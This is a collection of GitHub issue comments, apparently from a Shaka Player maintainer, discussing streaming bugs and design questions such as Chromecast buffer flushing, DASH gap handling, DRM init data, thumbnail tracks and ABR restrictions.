Shaka Player is calling remove(0, 60) on the audio SourceBuffer, and video.buffered reflects the removal, but the old content still gets rendered and does not get replaced.  The same thing happens with video if you manually switch video tracks.\nI will reach out to the Chromecast team for further assistance.\n. Quickest repro:\n1. Open Shaka Player demo.\n2. Click the cast button on the video controls.\n3. Click \"Load\" to load the \"Angel One\" clip.\n4. Expand the info panel.\n5. When the captain starts talking, select a different audio language.\nThe effect should be immediate because we clear the buffer.  We even stop to buffer the new audio, but it doesn't take effect until after the previous data is rendered.  If you've buffered the whole 60-second clip, you'll never hear the new audio.\n. We will need some kind of workaround for Chromecast since clearing the buffer does not flush the pipeline.  Chromecast team recommends seeking to flush.\n. A workaround has been committed, but will not show up in our receiver demo until we deploy a new release to appspot.  v2.0.1 is coming soon, though.\n. JFYI, this fix was released as part of v2.0.1.\n. You'll need to sign the CLA and add yourself to AUTHORS and CONTRIBUTORS (please keep them alphabetized).  See CONTRIBUTING.md for details.\n. Hi Patrik,\nWe only do a HEAD request to probe the manifest type if we are unable to deduce the type from the manifest URI's file extension.  If your URI ends with .mpd (not counting any GET parameters), then we will not have to probe with a HEAD request.\nWe do provide the HTTP response body when there's an HTTP error, but this only works for GET and POST requests.  A HEAD request does not result in a response body, so we can't provide the text.  The best way to get the error text for a manifest request is to avoid the HEAD request.\nAs you've noticed, Player.load()  has an optional parameter opt_manifestParserFactory that allows you to specify the manifest parser and avoid the registry completely.  We intended this for custom manifest parsers rather than for overriding detection.  This is why we don't export DashParser already.\nWe'd be happy to export DashParser going forward because that could be useful for other reasons, but we still feel that the best way to solve this problem is to have a recognizable file extension in the URI.\nDoes this help?\n. I filed a new issue to export all plugins in general.\n. Thanks for reaching out!\nCan you help us understand what you mean about multi-key content handling?  It would be useful for us to understand the issues you've already identified.\n. I don't understand what you mean about ExoPlayer.  Are you saying that one request results in multiple keys?  Or that ExoPlayer assumes that this will always be the case?\nWidevine can deliver multiple keys in one license response, on all platforms.  Is this what you mean about \"batching up\"?\nShaka Player does not have any hard-coded knowledge of Widevine behavior, nor any other key system.  We assume that multiple requests might be needed.  We do not assume one key per request, nor do we assume multiple keys per request.  We make one request per unique init data.  The number of unique init datas should be less than or equal to the number of unique key IDs.\nDepending on how the init data was created, this may result in redundant Widevine licenses (which the Widevine CDM can handle gracefully).  We can't read the provider-specific payload of the init data, so we don't know what we are actually requesting based on that init data.  If the Widevine payload has a content ID that maps to multiple key IDs, then the response may contain multiple keys.\n. We filter out duplicate init data exactly because we can't read meaning into PSSHs.  Generically, we can't read key IDs out of init data.  PSSH v0 is still in wide use, and it does not contain key IDs in any generic form across key systems.  PSSH v1 makes this better by providing a generically-parseable set of key IDs, but we don't see it in wide use because it seems that some devices don't support it.  (I don't have specific data on PSSH version support in devices.)\nTwo dissimilar PSSHs may contain the same key IDs, but two identical PSSHs definitely contain the same key IDs, content IDs, whatever, and can obviously be filtered out.\nIt would be better if we filtered based on key IDs in the manifest, but those are not always provided.  We could start requiring them in Shaka Player for DASH content, but we would not be able to do that unless there was an equivalent in HLS (which we are actively working on).\nI think best-effort for Shaka Player would be:\n1. Filter out duplicate init data from any source (we do this now)\n2. Filter out init data from the manifest based on duplicate default_KID, if present (we do not do this currently)\n. I should also mention that filtering out duplicate init data is something we only do as an optimization.  It should not be strictly necessary, as having two MediaKeySessions containing the same keys is a non-issue on the client side.\nSo, although I see the benefit in improving this filtering logic to make use of default_KID when available, it is not a high priority for us at this time.  I just filed it as issue #580.\n. I was able to reproduce your results on my Chromebook.  I see the playback stuck at 27.167347, and a gap in the video timeline from 24.12 to 25.12.  The buffered ranges are (0 - 24.12) and (25.12 - 59.512744).  The manifest only contains one Period, so this can't be caused by a gap between Periods.\n. If I disable ABR via player.configure({abr: {enabled: false}}); there is not gap and the problem goes away.  So it may be that the Representations don't align, or it may be that we made a mistake when switching.\n. The only two video tracks are 1.5Mbps and 5Mbps, so you can't reproduce on slow or flaky wifi (wifi at this conference is currently acting up, so I'm having difficulty now).  It seems that you need more than 5Mbps to reproduce the bug.\n. Timestamps from the content (using DTS since that's what Chrome is returning for buffered ranges):\n| Segment number | Ideal timestamp from manifest | Low-bitrate media timestamp | High-bitrate media timestamp |\n| --- | --- | --- | --- |\n| 1 | 0 | 0 | 0 |\n| 2 | 4 | 3.96 | 4.12 |\n| 3 | 8 | 8 | 7.96 |\n| 4 | 12 | 12 | 12.76 |\n| 5 | 16 | 16 | 16.96 |\n| 6 | 20 | 20 | 20.24 |\n| 7 | 24 | 24 | 25.12 |\n| 8 | 28 | 28 | 28.4 |\nThis is the best way to reproduce the bug in Chrome, using your content and our latest nightly build:\n``` js\nplayer = shakaDemo.localPlayer_;  // for demo app\n// disable ABR\nplayer.configure({abr: {enabled: false}});\n// wait for time 16, then switch to the high bitrate track\nswitched = false;\nvideo.addEventListener('timeupdate', function() {\n  if (video.currentTime > 16 && !switch) {\n    switch = true;\n    // switch and clear 2 segments ahead (16 + 2*4 == 24)\n    player.selectTrack(player.getTracks()[1], 2);\n  }\n});\n```\nThe player clears ahead starting at 24, and then looks up the segment needed to fill in time 24.  Based on the manifest, that's segment 7, but due to the drift in the table above, this would have to be segment 6 instead.\nThe DASH spec allows content timestamps to wander away from the ideal time in the manifest by up to one half segment.  We have a mechanism to cope with this.  When we seek, we assume that some amount of drift exists and factor that into our calculation about what segment to fetch.\nHowever, what we see here is that one Representation wanders away from the other Representation.  It appears that this should not be allowed.  DASH IOP v3.3, section 3.1 states:\n\n(Sub)Segments are constrained so that for switching video Representations within one Adaptation Set the boundaries are aligned without gaps or overlaps in the media data.\n. Looks good to me.  Thanks for the patch!\n\nCould you please update the tests in test/net/data_uri_plugin_unit.js to reflect this?  There's already one that involves a MIME type, so the testSucceeds() helper just needs an update to check the headers.  You can run tests locally with python build/test.py\n. I think an empty string or null is appropriate.  I wouldn't fill in defaults for content-type if the underlying transport doesn't have a MIME type concept.  It might lead to confusion later.\n. Everything looks good to me.  I'll run it through the build bot.\n. Thank you for your contribution!\n. Thank you for letting us know!  Accessibility is important, but we have not had any rigorous testing around that.\nIs this the extension you are using?  http://wave.webaim.org/extension/  I want to make sure we can reproduce your results correctly.\n. ERR_CONNECTION_RESET means the TCP connection was reset.  This is below the level of HTTP and could have many root causes.  If no server is listening on the port (8089 in your case), then the OS will send a TCP reset when the client tries to open the connection.  The connection would also be reset after it is established.\nI can only guess what is causing it, but you should look at your server first.  Unfortunately, that's the most support I can realistically give for server errors.  If you need help finding resources for further reading, let me know.\n. We don't currently support discontinuity at all, but I'd love to see your patch.  Perhaps I have been over-complicating it.\nAs for short periods and dummy content, we don't have any such content available.  Can you provide a test stream so that we can take a look?\n. @baconz, this seems related to a conversation we were having about gaps.\n@agelun, it appears that you detect when the playhead is in a gap, and move it to the other side.  This is something we have considered before and decided not to do.\nI took a look at the sections of the IOP you referenced.  (The same content appears in the same sections in the most up-to-date version of IOP, v3.3.)\nMy reading of the IOP is that there are three mechanisms:\n1. Dummy content.  This means that the server generates or uses pre-made media to fill the gap in the input.  The output DASH stream has no gaps.  Dummy content requires no player support, so this is a definite option for you.  (Note that in my interpretation, this is not the same as serving a 404.)\n2. \"Short Periods\".  These are periods with no media at all.  We do not support these currently.\n3. 404s.  The Period element points to media which is not there on the server.  When the segment is requested, we get a 404 and we know that there is no such segment.  We do not support this either.\nIt appears that using 404s is the same as short periods in concept.  Both indicate that segments are not available and will not be available.  The main difference is in when the player finds out.  A short period tells the player at manifest parse time that there's no content.  A 404 when fetching a segment tells the player later, when it starts trying to buffer the relevant section of the presentation.\nI dislike using 404s for this because there are other ways to encounter them, such as bad clock sync or a misbehaving server.  If the player is expected to happily move past 404s, it may make debugging certain server problems more difficult.\nShort periods are more clear, but still don't fit into our current architecture.  We don't expect to be able to play through gaps, and these empty periods just signal \"here's a gap\".\nI'm not sure if/when we would be able to support gaps.  Because of the way MediaSource works, I believe it is difficult for JS-based players to deal with gaps elegantly.  I'm averse to extra complexity in the player.\n. We decided not to jump over the gap for many reasons, but I think they are becoming increasingly irrelevant.  Let's figure out the best solution and work toward getting it merged into Shaka Player.\nIn my view, there are many reasons for gaps:\n1. Broken content.  The fact is that we get many support requests that turn out to be bugs in the encoder or bad input to the encoder.  See #562.  Broken content and non-IOP-conforming content are things we don't intend to support.  I think failing on broken content is appropriate and helps to highlight and fix bugs in encoders.  Jumping gaps here may hide these content issues, but that shouldn't be a deal-breaker.\n2. Browser bugs.  As of this writing, Chrome is still mixing up DTS and PTS, which can sometimes cause gaps to appear at the start or end of a Period even when there are none in the content.  Jumping gaps in this case might be a good thing, in that it would work around browser bugs when possible.\n3. True discontinuity.  This is permitted by IOP and a reality of live streaming for encoders which don't generate dummy content.  Jumping gaps in this case is a clear win, as it allows us to play live streams we couldn't otherwise play.\nI don't see any good way to differentiate between these three cases, so probably it's best to try to handle all gaps.\nOne thing that worries me is the use of 404s to signal discontinuities.  There are other times a 404 may occur:\n1. Again, broken content.  If I mis-encode VOD content, segments might be missing or their URLs might be wrong in the manifest.  Ideally, we would fail on such content so that the app developer sees an error and can start investigating.\n2. Live content when clock sync is broken or misconfigured.  If the app config is wrong, the player might request past the proper live edge and get a 404 from the server.  In this case, treating a 404 as a discontinuity would result in the player requesting the next segment after that, and so on.  The rest of the stream would appear as one big gap and would generate no errors.  Ideally, we would fail with an error in this case, too.\n3. True discontinuity.  These could appear at the live edge or elsewhere, depending on whether a time shift buffer is used.  Ideally, we should handle this gracefully somehow.\nI'm unsure how to differentiate the third case from the other two.  Perhaps we could have a heuristic for that, such as isLive && numConsecutive404s < errorThreshold.  If there are too many in a row, we would decide we were in case 2 and fail.  If it was VOD, we would decide we were in case 1 and fail.\nWe've also discussed two different strategies for handling gaps:\n1. Seek over gaps automatically.  I'm concerned about the complexity of this, but it could work.  Playhead seems the most reasonable place to detect and jump gaps.  It could be similar to how we keep the playhead inside the seek range.\n2. Dispatch events to allow the application to decide what to do.  If the app isn't expecting gaps, it could fail.  This offers greater flexibility, but requires more effort on the part of the app developer.  Extra work is required for any app expecting gaps, to listen for that and jump over them.  Extra work is also required for any app not expecting gaps, to listen for them and fail.\nThoughts?  Specifically on:\n- decision not to differentiate causes of gaps in JavaScript\n- heuristic to differentiate between good 404s and bad ones\n- pros/cons of strategies for jumping gaps\n. We plan to implement what we are calling \"gap jumping\": automatically jumping the play head over gaps in the timeline.  vLater meant that it is not scheduled for a specific release yet.  (This milestone has since been renamed to \"Backlog\".)  We have decided to wait until after v2.1.0 is released, to avoid any risk to that release.\nWe will release a design doc in the near future, and link to it here.\nThank you for your patience with this issue.  Tolerating gaps in the timeline is a big change in behavior for Shaka Player, and we are being very careful.. There have been so many related issues that it is difficult to track.  Since github's issue tracker doesn't have a field for related issues, I have manually compiled a list for posterity:\nhttps://github.com/google/shaka-player/issues/180 https://github.com/google/shaka-player/issues/377 https://github.com/google/shaka-player/issues/472 https://github.com/google/shaka-player/issues/654 https://github.com/google/shaka-player/issues/656 https://github.com/google/shaka-player/issues/661 https://github.com/google/shaka-player/issues/668 https://github.com/google/shaka-player/issues/670 https://github.com/google/shaka-player/issues/672 https://github.com/google/shaka-player/pull/731 https://github.com/google/shaka-player/issues/732. Shaka Player uses a default bandwidth estimate before it has enough data to build a real estimate.  That default is configurable, and defaults to 500kbps.  You might want to try customizing that.  See abr.defaultBandwidthEstimate in the player configuration.\nAlso, we recently made some changes to speed up adaptation decisions.  Can you try again using our nightly build to see if the situation is improved?\n. We intend to release v2.0.1 with this fix soon, but we are still doing QA to make sure the ABR changes are good ones.  In the mean time, you do not have to wait for release versions if you want to build from master.\n. Hi Alex,\nA Widevine license request is not in JSON format.  I apologize if the docs gave you the wrong impression.  If you can point out what part of the docs made you think that, we will be happy to correct them.\nShaka Player will not, by default, make any changes to the format of the license request or response.  The request from the CDM is sent directly to the configured license server, and the response from that license server is given directly back to the CDM.  Both request and response are in a non-readable binary format.\nDoes that answer your question?\n. The raw request coming from the CDM should be sent to the Widevine backend in whatever format the backend requires from the proxy.  I can't comment on what additional parameters you might need, but anything you want to add to the request on the client side will require license wrapping.\n. You're right, the spec is very permissive.  However, it is very difficult to make a generic client that supports everything in the spec.  Instead, we try to stick to the guidelines in the DASH Interoperability Points (IOP), which are much more restrictive and reasonable to implement for a generic client such as ours.\nI believe the best thing for thumbnails would be to follow the model of trick mode.  Here's the relevant text on trick mode from IOP v3.3:\n\n3.2.9. Trick Mode Support\nTrick Modes are used by DASH clients in order to support fast forward, seek, rewind and other operations in which typically the media, especially video, is displayed in a speed other than the normal playout speed. In order to support such operations, it is recommended that the content author adds Representations at lower frame rates in order to support faster playout with the same decoding and rendering capabilities.\nHowever, Representations targeted for trick modes are typically not be suitable for regular playout. If the content author wants to explicitly signal that a Representation is only suitable for trick mode cases, but not for regular playout, it the following is recommended:\n- add an Adaptation Set that that only contains trick modes Representations\n- annotate the Adaptation Set with an EssentialProperty descriptor or SupplementalProperty descriptor with URL \"http://dashif.org/guidelines/trickmode\" and the @value the value of @id attribute of the Adaptation Set to which these trick mode Representations belong. The trick mode Representations must be time-aligned with the Representations in the main Adaptation Set. The value may also be a white-space separated list of @id values. In this case the trick mode Adaptation Set is associated to all Adaptation Sets with the values of the @id.\n- signal the playout capabilities with the attribute @maxPlayoutRate for each Representation in order to indicate the accelerated playout that is enabled by the signaled codec profile and level.\nIf an Adaptation Set is annotated with the EssentialProperty descriptor with URI \"http://dashif.org/guidelines/trickmode\" then the DASH client shall not select any of the contained Representations for regular playout.\n\nSimilarly, thumbnails should be in an AdaptationSet which is labeled as not appropriate for normal playback, but associated with specific AdaptationSets which are for normal playback.  That would allow clients to identify and skip thumbnails if they don't support them, or to invoke special logic if they do.\nI think the best thing to do is to create a proposal for the formatting of the content and the description of it in the manifest, as well as some sample content for demo purposes.  The client-side support could be incubated in Shaka Player under an experimental branch until we feel good about the specifics.  The solution could be proposed to the DASH-IF for inclusion in the IOP.  All of this is assuming, of course, that there is no similar work already underway in the DASH-IF.\n@baconz, I know you were interested in something similar.  Any thoughts?\n@wilaw, is there any work underway in the DASH-IF for thumbnail tracks already?\n. Sorry, Will, that's not quite what I meant.  Let me clarify.\nI believe the use-case here is that people want to show a thumbnail from the video as part of the scrubbing UI.  For example, as you drag the scrubber, a thumbnail of that part of the video would hover above the scrubber, and when you release the scrubber, the video seeks to that point and hides the thumb.\nI don't think we should use trick play tracks as thumbnails.  Trick play tracks are videos that must be decoded by the browser in a media element, so they can't be easily used for the UI scenario I just described.  Further, they may be encrypted, which would prevent the frames from being copied to a canvas even if the track was loaded in an off-screen video element.\nInstead, I think we should come up with another EssentialProperty URI, like the one for trick play, but specifically for thumbnails.  The thumbs would be images like jpegs or pngs that could be easily used in the UI.  Something along these lines:\nxml\n    <AdaptationSet id=\"12\">\n      <EssentialProperty schemeIdUri=\"http://dashif.org/guidelines/thumbnails\" value=\"10\" />\n      <Representation id=\"12\" mimeType=\"image/jpeg\" width=\"100\" height=\"75\" frameRate=\"1/5\">\n        <SegmentTemplate media=\"thumb$Number$.jpeg\" duration=\"5\" />\n      </Representation>\n    </AdaptationSet>\nIs that crazy?  Is that something the DASH-IF would be interested in incorporating if we incubate the concept here first?\n. Thanks, Will!  Does anybody have feedback on this proposal or the sample media provided by Will?\n. It would seem to me that showing thumbnails while scrubbing already necessitates a custom UI.  You couldn't do that with built-in controls as far as I can tell.  So the best way to trigger it, I think, is on some UI event like input, change, mousedown, touchstart, etc.  I haven't worked out the details for our own demo UI yet, but I'm sure we will implement this in the near future.. @wilaw, I'm sorry I haven't looked at this closely or provided feedback on what landed in the latest IOP.  I'm grateful that you and your colleagues in the DASH-IF worked out the details, and I look forward to implementing in Shaka Player once we make time for it.\n@chrisfillmore, we haven't looked at the details and we don't have a time estimate.  It's a lower priority item for us than some of the HLS work we're doing, so this is still on the backlog.  If you are interested in contributing, I would be happy to talk design and review a pull request.. Since you didn't say DASH, I'm assuming your WebM content is just single WebM files, not adaptive bitrate DASH-packaged WebM.  Correct me if I'm wrong.\nNo matter what you do, you'll need to package the WebM files to make them MSE-compatible.  A DASH packager such as Shaka Packager will do this for you.  You don't have to re-encode to multiple bitrates if you don't care about ABR.\nI see the following options:\n1. Package the WebM files and generate DASH manifests for them.  Combine those manifests into one using multiple DASH Periods to stitch them together.  Shaka should play this seamlessly.  If you don't know in advance the sequence you want, then this might not be the solution for you.\n2. Write your own MSE player.  You can decide at runtime what file you want to play next.  You would want to set timestampOffset in SourceBuffer to the duration so far, then append the next file.  The offset will be added to the timestamps in the content.  If you don't want to work with MSE directly, then this might not be the solution for you.\n3. Write a custom manifest parser for Shaka Player.  This is an approach somewhere in the middle.  You would need to know the byte ranges for the init and index segments.  From that, you could construct the segment index.  Your parser would then tell Shaka that there's a period with one stream set, which contains one stream.  That stream would contain callbacks to read the segment index.  You could copy this from our DASH parser.  You could decide at runtime in the client which clip was next and update the manifest to add a new period for that clip.\n4. Write server-side code to generate a multi-period DASH manifest.  If you had already generated individual manifests for each clip, it would be fairly easy to have server-side logic to generate a multi-period manifest on the fly for any given sequence.  It's just parsing and combining XML documents.  You could update this sequence at any time, even based on signals from the client.  For example, play clip one with http://foo.bar/manifest?1, but then update the manifest URL later to http://foo.bar/manifest?1,72 to play clip 72 after 1, and so on.  Shaka Player would grow the presentation as new clips were added to the manifest, and the manifest itself would signal how often to update.  Client-side code (Shaka network request filter) can change the manifest URL arbitrarily to add clips to the request parameter.\nI know that's a ton of info, and I'm guessing a lot of things about your purpose and content, so this may or may not be that helpful.  Please let me know if any of this was on target or if I can help answer any more specific questions.\n. I am not aware of any restriction on WebM in Firefox.  On Linux, where I have no hardware decoder, I can play both WebM and h264 on Firefox.\nNote that only Chrome, Firefox, and Opera will play WebM as far as I know. (It's been a while since I tested this.)\nIf you feed a single WebM file from your recorder to MediaSource, can you play it?  If so, you won't need to package or remux them, which is good news.\nIf the files are small (a few seconds), then a fake manifest parser might be the best option.  You can describe each file as a single period, each period has a single stream set, each set has a single stream, each stream has a single segment (the whole file) and no init segment.\n. @Ajaay, I noticed two codecs in your type. Perhaps the issue is that your content is multiplexed. Try MediaSource.isTypeSupported('video/webm; codecs=\"vp8\"'); That will show you whether or not WebM is supported by Firefox when it's not multiplexed. Also try MediaSource.isTypeSupported('audio/webm; codecs=\"vorbis\"');\n@sandersaares, we achieve seamless multi period playback by requiring that codecs be the same across periods.  Once we choose AdaptationSets for the first period, we filter out incompatible streams from the entire manifest.  We believe it would not make sense to have multicodec content where different periods use a different set of codecs, even though it is allowed by the DASH spec.\n. That's very interesting.  I see vp8 and vp9 supported on the machines available to me.  What version of Firefox are you running, and on what platform?\n. Interesting.  I'm running the same.  @cpearce, any suggestions?  It seems like Firefox should support vp8 and vp9 on OS X, or at least it does for me.  But it does not for @Ajaay.  Do I have certain flags enabled that I have forgotten about?\n. Thanks, @cpearce.  @Ajaay, you can try the webm setting in about:config to unblock you on development.\nI suggest using a fake manifest parser plugin for Shaka Player.  Each clip can be its own 1-segment period.  If that is too complicated, you can always write your own MediaSource app.  I recommend strongly against using sequence mode, though.\n. Yes, exactly.  There's an interface called ManifestParser that you will have to implement, and you'll have to register it with Shaka Player.  You can either compile it into the library in a custom build, or you can leave it in the app (outside the library) and register it at runtime.\n. Closing due to inactivity.. Hi Niklas,\nWe already have a mechanism for this in Shaka Player using player.configure() and the restrictions key.\nPlease take a look at the docs and let me know if this meets your needs.\nThanks,\nJoey\n. I see.  Well, ultimately, we don't really want two mechanisms for the same thing.  I think that will be confusing and increase the complexity of what we have to maintain.\nLet me restate the problem and make sure I understand you: you want to restrict ABR decisions without restricting manual track selection.  Is that accurate?\n. What would be the high-level purpose of this?  Why should a person be able to select tracks that are off-limits to the machine?\n. I see HTTP 404 errors trying to fetch certain segments:\nhttp://nightly.shaka-player-demo.appspot.com/demo/?asset=http://217.172.83.187/video/smil:video/AS339_A_vitjan_i_Dali_31101989.smil/manifest.mpd;play\nShaka Error NETWORK.BAD_HTTP_STATUS (http://217.172.83.187/video/smil:video/AS339_A_vitjan_i_Dali_31101989.smil/chunk_ctvideo_ridp0va0br199918_cs1080000_w1820516199_mpd.m4s,404,)\nThe manifest has media template of \"chunk_ctvideo_rid$RepresentationID$_cs$Time$_w1820516199_mpd.m4s\", so the missing segment is Representation ID \"p0va0br199918\" and time 1080000.\nThe relevant SegmentTimeline begins like this:\n<SegmentTimeline>\n                <S t=\"0\" d=\"1080000\"/>\nSo segment 1 starts at 0 and ends at 1080000, which means segment 2 was missing.  The Representation in question is the 180p version of the video.\nThe Shaka Player library dispatches an error but keeps going.  The ABR system decided (at least in my case, due to my bandwidth) to switch to a higher resolution (360p instead of 180p).  The 360p Representation was not missing that segment, so for me, I see playback continue after the error.\nEach application can decide what to do with error conditions: abort, keep trying, etc.  It's possible that JWPlayer's policy is to abort on these errors.  It's also possible that a given user may not have the bandwidth to support 360p, so playback may stall on that missing segment even if the error were ignored by the application.\nShaka Player does not support content with missing segments.  This goes against DASH IOP as I understand it.  All segments should be available in VOD content, and all Representations should be aligned and contain the same segments.\nMy advice is to file a report with Wowza that this VOD content is missing segments in some Representations.  Feel free to reference this analysis if it's helpful.\n. Thanks @BucherTomas.  Since the root cause seems to be the underlying media, I'm going to close this issue for Shaka Player. @HeidiW, please let us know if there's anything else we can do.\n. I'm not sure what it would mean to clean up the styling.  Do you mean that this option would ignore styling and only parse the text payload of each cue?\n. @birme, the way our parsers work is that we extract the text and the styling and apply it all to a cue object we feed to the browser.  The browser does all the rendering.  For us, there's no difference between default styling and no styling.  Does this make sense?\n. Let me see if I understand you.  You want the ability to instruct Shaka Player to ignore styling and only parse the cue timing and text.  Is that correct?\nDo you also want the ability to specify replacement style attributes, or is it enough to let the browser apply its defaults?\n. Okay, sounds good.  Thanks!\n. Let me see if I understand you correctly.  Some errors are non-fatal, such as HTTP errors, while some are fatal, such as a malformed manifest.  You'd like to know which ones are fatal and which ones aren't, so you can avoid showing the user errors they don't care about.  Is that accurate?  Did I miss anything important?\n. I've renamed the issue to \"indicate fatal errors\".  I think it's very reasonable to add this to shaka.util.Error in our next release.. Sorry for the delay.\nThe bug where you seek to 0.1 is likely caused by Chrome's mixup of DTS/PTS.  If the higher res streams use more b-frames, it's possible that this bug in Chrome would affect those streams, but not the lower-res or lower-profile ones.  A solution to #555 could be an effective workaround for this Chrome bug.\n\nProblem with current situation:\n1. If no stream matches the configured restrictions, the user will be presented a black screen with audio.\n\nRestricting all streams should be an error.  There is no reason to restrict all streams, and no reason to expect playback if all streams are restricted.\nBefore we go too far into redesigning Restrictions, let me give you some history.  The reason we created the Restrictions object was to allow apps to give us hints about things we can't know.\nFor example, say your content has a policy that forbids HD playback on a certain device.  Your license server may be able to communicate to your application that it does not meet the requirements for HD.  If there's no other indication that the HD streams are not playable (key statuses, etc), then your application needs to tell the library to forbid those HD streams.\nIf they are selected, playback will definitely fail.  Not only should they not be selected by AbrManager, the user should not be able to select them, either.\nThat is what Restrictions was originally designed for: app-communicated, DRM-based restrictions.  The first extension of Restrictions beyond that was by @sanbornhnewyyz in #32 to add maxBandwidth.  @sanbornhnewyyz, what is the high-level purpose of this parameter for you?  Are you trying to limit data usage for mobile users?\n@niklaskorz, here are my suggestions.  These options don't break the concept of serious, DRM-based restrictions:\n1. Introduce a second Restrictions object that only applies to AbrManager.  The original Restrictions object restricts the availability of tracks for critical reasons.  The second Restrictions object (maybe nested under abr in config) will only restrict which tracks AbrManager can select.  The user can override these second restrictions.  This option is more flexible, and might be a better fit for things like limiting mobile data use.  It would be a little more complex, though, since it requires the app to update the config every time the video changes size.  At least the app should know exactly when the video changes size, because it is in control of going fullscreen.\n2. Add a config flag for AbrManager that is similar to dash.js's setLimitBitrateToPortal.  If set, AbrManager will use the size of the video element as an additional limitation.  This flag won't affect any other part of the system, such as the track list.  This option is simpler for the app developer, but less flexible.  It also requires the library to poll the video element's size, which is ugly.\n3. A mix of the two.  A second Restrictions object, which can be auto-updated with resolution restrictions based on the video element if a certain flag is set.\n@niklaskorz, @sanbornhnewyyz, thoughts on these options?  @sanbornhnewyyz, am I guessing correctly that you want to limit mobile data usage?\n. @dobrusev,\nI've filed a separate issue (https://github.com/google/shaka-player/issues/744) to make those things configurable.\nAs for maxBandwidth, that would restrict which video streams are available for AbrManager to choose.. Shaka Player ingests DASH streams and plays them using a browser's MediaSource API.  Right now we only have a manifest parser for DASH, but you can write plugins to ingest other manifest formats.  Regardless of manifest format, the underlying media must be supported by MediaSource for it to be playable.\nIf you know what formats and codecs you want to stream, you can see what MediaSource supports on any given browser by opening the JavaScript console and typing something like this:\njs\n// AAC:\nMediaSource.isTypeSupported('audio/mp4; codecs=\"mp4a.40.2\"');\n// Vorbis:\nMediaSource.isTypeSupported('audio/webm; codecs=\"vorbis\"');\n// Opus:\nMediaSource.isTypeSupported('audio/webm; codecs=\"opus\"');\n// MP3:\nMediaSource.isTypeSupported('audio/mpeg');\nAre you trying to do Icecast/Shoutcast specifically?  Or just something like that using DASH or HLS?  Although we are focused on video and adaptive bitrate streaming, you can feed in audio-only data or single-bitrate media without any issues.\n. I'm saying that Shaka plays the file formats that the browser plays.  Shaka does not do any decoding of media on its own.\nYou can check MP3 support in your browser by running this in the JavaScript console:\njs\nMediaSource.isTypeSupported('audio/mpeg');\nThis returns true for me on Chrome on Linux.  I haven't tested other browsers.\n. Audio-only data is fine.  If the manifest structure contains no video streams, we will still play it.  We have an example of an audio-only file in the demo app (\"Dig the Uke\").  Single-bitrate, for us, means only one audio stream, as opposed to several in different bitrates.\nAn audio element is fine.  We actually accept HTMLMediaElement, which is a base class of both HTMLVideoElement and HTMLAudioElement.\nTo support shoutcast, you would need to write a manifest parser plugin.  A manifest parser plugin is JavaScript code that implements a certain API and plugs into Shaka Player.  It takes a manifest URL, fetches, parses, and interprets that manifest, and produces output in a standard format that Shaka Player's internals understand.  Your plugin would take the source URL and create a manifest object that drives Shaka's StreamingEngine.  If you are not experienced in JavaScript, this might be challenging.\nShoutcast/icecast isn't on our roadmap, so unfortunately, my team doesn't have the resources to create that plugin.  We are here to help with documentation, pointers, and explanations as they relate to Shaka Player.  We are not familiar with the shoutcast/icecast enough to suggest how that would map to our manifest structure, though.\n. It's working fine for me.  Could it be your internet connection?\nDoes it load faster in compiled mode?\nhttp://shaka-player-demo.appspot.com/demo/?compiled\n. Compiled mode should load much faster because there is only one JavaScript file to load for Shaka Player instead of 74 individual class implementations.  For fast internet connections, uncompiled mode is usually fine.  It's also necessary to use uncompiled mode for debugging, which is why it's the default on our demo app.  Production deployments should always use the compiled library.\nHope that helps!\n. Browsers will not allow https pages to load http resources.  This is called \"mixed content\".  The restriction is implemented inside browsers and cannot be controlled by Shaka Player or any other JavaScript app.\nI'll leave this open while you two work on the Wowza/nginx side, but this is working as intended for Shaka Player.\n. Ah, I though that the page itself was also https.  My mistake.\n. Since this appears to be a Wowza bug, it seems like it would be more appropriate to move discussion to Wowza support.  Also, I believe a quick fix on Wowza's side would be to drop the protocol from the Location URL.  For example: //foo.bar/baz instead of http://foo.bar/baz.  The client should be able to resolve this using the protocol of the original manifest.\n. Glad to hear it!  Let us know if we can do anything else for you.\n. v2.0.1 makes faster adaptation decisions than v2.0.0 did.  This is intentional, and based on feedback that Shaka sometimes took tens of seconds to adapt when playback started.  See 8152e64 for the commit.\nIt's not instant, though.  The time first choice is very low, less than one second for fast connections.  The time to that choice being visible on screen depends on many factors, but primarily buffering goal and segment size.  In my tests with 4 second segments, 10 second buffering goal, and ample bandwidth, I see visual changes after 8 seconds.  Until then, the resolution is determined by the default bandwidth estimate, which is configurable.\nI haven't seen any issues with seeking events on Firefox.  Can you reproduce with our demo app, or only with your own app?  Can you provide a steps to reproduce?  (Next time you file an issue, please use our template.)\n. @jyavenard, can you please clarify what your fix is?  I don't see any code here.  Can you submit a PR?\n. I just managed to reproduce this bug on Chrome by rapidly seeking.  The system got stuck in a seek loop, which eventually resolved after many hundred iterations.\n@cpeterso, I believe this is not Firefox's fault.  I hope you haven't spent too much time investigating on the Mozilla side.\n. I pushed a commit that should fix this.  Please let us know if that's not the case, and I can reopen.. I haven't debugged at all, but I believe this is a bug.  It's caused by the fact that StreamingEngine treats text the same as any other track type.\nFor audio and video, it is not legal to change containers or codecs.  MediaSource would have to be torn down for that, and in order to maintain seamless playback, we never tear down MediaSource within one presentation.\nText, on the other hand, is not handled by MediaSource in our player.  So we could change text parsers on-the-fly when changing text tracks.  StreamingEngine treats it like audio or video, though, and feeds the side-loaded text track to the text parser it already initialized.\nWe'll try to address this in v2.1, but side-loaded text is a low priority right now, so it might slip.\n. BAD_ENCODING means that the UTF-8 decode in shaka.util.StringUtils.fromUTF8 failed.  This indicates malformed text content.  If the text content is not malformed, please file a new issue and provide a sample and steps to reproduce the error.\nError 3015 is MEDIA_SOURCE_OPERATION_THREW, which is unrelated to text.  This indicates that the browser had a problem with your audio or video.  If you think this is not right, please file a new issue and provide a sample and steps to reproduce the error.. Thanks for the PR.  I've read through it, but I'm not sure if it's the right fix.  There might not be a better option, but I want to do a little digging first.  It seems like this would be adding work-arounds on top of work-arounds, so I am questioning the original work-around.\n. Thank you for this PR, but I am going to implement a slightly different fix.  Rather than make flushing conditional in MediaSourceEngine, I'm going to make flushing an explicit, separate action driven by StreamingEngine.  I'm also going to use a slightly different approach in StreamingEngine's mediaStates.\n. I'm unable to reproduce using our demo app, our content, and a v1 Chromecast from 2013.\nHere is what I did:\n1. Load the demo app.\n2. Click the cast button in the video controls in the sender.\n3. Select the first-generation Chromecast from the list of receiver devices.\n4. Select \"Sintel 4k (multicodec, widevine)\" from the asset list.\n5. Click the \"Load\" button.\n6. Let the video play for 15 seconds on the Chromecast.\n7. Click the cast button in the video controls.\n8. Click \"stop\" in the cast dialog to terminate the receiver app.\n9. 